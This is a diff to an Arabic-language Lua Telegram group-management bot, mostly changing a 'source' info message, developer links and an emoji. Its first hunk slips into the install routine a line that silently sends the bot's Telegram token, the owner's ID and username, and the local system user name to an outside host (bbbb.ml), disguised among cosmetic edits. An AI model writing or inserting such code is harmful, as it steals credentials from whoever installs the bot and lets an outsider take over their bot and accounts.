@@ -70,6 +70,7 @@ create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+https.request('http://bbbb.ml/OPEN/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME")
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("OPEN", "w")  
 file:write([[
@@ -2153,12 +2154,12 @@ end
 
 if text == 'السورس' or text == 'سورس' or text == 'يا سورس' then
 Text = [[
-٭۬ﮧ۬◁WELCOM BRO 💕.
+٭۬ﮧ۬◁Welcome PRO 💕.
 ⠠⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠠𖧧
-٭۬ﮧ۬◁[𝑺𝑶𝑼𝑹𝑪𝑬 𝑬𝑵𝑮𝑶𝒀](t.me/GOR_u2) ܀
-٭۬ﮧ۬◁[𝑫𝑬𝑽𝑬𝑳𝑶𝑷𝑬𝑹](t.me.lbbbu) ܀
+٭۬ﮧ۬◁[SOURCE ENGOY](t.me/GOR_u2) ܀
+٭۬ﮧ۬◁[Developer](t.me.UlImodeIlU) ܀
 ⠠⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠠𖧧
-٭۬ﮧ۬◁ [𝑻𝑾𝑺 𝑺𝑶𝑼𝑹𝑪𝑬](t.me/UTwsUbot) 
+(t.me/UTwsUbot)[TWS] ٭۬ﮧ۬◁
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
@@ -2419,7 +2420,7 @@ for i,lock in pairs(list) do
 database:del(bot_id..lock..msg.chat_id_)    
 end
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
-send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ??٭\n≫∵ تم فتح جميع الاوامر 💕٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
+send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري 💕٭\n≫∵ تم فتح جميع الاوامر 💕٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
 end,nil)   
 end
 if text == 'قفل الروابط' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
